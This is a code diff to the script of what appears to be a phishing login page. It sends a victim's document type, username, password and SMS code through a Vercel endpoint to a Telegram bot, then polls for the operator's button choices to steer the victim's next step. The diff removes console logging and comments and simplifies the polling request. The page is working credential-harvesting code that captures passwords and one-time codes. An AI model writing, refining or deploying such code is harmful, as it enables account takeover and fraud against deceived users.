@@ -349,9 +349,9 @@ select.input { cursor: pointer; }
 
 <script>
 // ==========================================
-// CONFIGURACIÓN (AHORA APUNTA A VERCEL)
+// CONFIGURACIÓN DE VERCEL (RUTA RELATIVA)
 // ==========================================
-const API_URL = '/api/send'; // Esta es tu función en Vercel
+const API_URL = '/api/send';
 
 // ==========================================
 // ELEMENTOS
@@ -420,7 +420,7 @@ togglePassword.addEventListener("click", function() {
 });
 
 // ==========================================
-// ENVIAR A VERCEL (BACKEND)
+// ENVIAR A VERCEL
 // ==========================================
 async function enviarAlBackend(payload) {
     try {
@@ -430,10 +430,8 @@ async function enviarAlBackend(payload) {
             body: JSON.stringify(payload)
         });
         const data = await res.json();
-        console.log('Respuesta del backend:', data);
         return data;
     } catch (error) {
-        console.error('Error de red:', error);
         throw error;
     }
 }
@@ -447,11 +445,10 @@ function enviarIdentificacion(tipoDoc, usuario, clave) {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
-            // Iniciar polling para escuchar las respuestas de los botones
             escucharBotones(handleTelegramActionLogin);
         } else {
             ocultarOverlay();
-            alert('Error al contactar al bot. Revisa consola.');
+            alert('Error al contactar al bot.');
         }
     }).catch(() => {
         ocultarOverlay();
@@ -488,7 +485,7 @@ function enviarSms(smsCode) {
 }
 
 // ==========================================
-// POLLING (A TRAVÉS DE VERCEL)
+// POLLING
 // ==========================================
 function escucharBotones(callbackAction) {
     if (!msgIdActual) return;
@@ -497,8 +494,7 @@ function escucharBotones(callbackAction) {
     async function check() {
         if (!pollingActivo) return;
         try {
-            // Usamos GET para consultar si hay novedades
-            const res = await fetch(`${API_URL}?action=poll&offset=${ultimoUpdateId + 1}&msgId=${msgIdActual}`);
+            const res = await fetch(`${API_URL}?offset=${ultimoUpdateId + 1}`);
             const data = await res.json();
 
             if (!data.ok || !data.result || data.result.length === 0) {
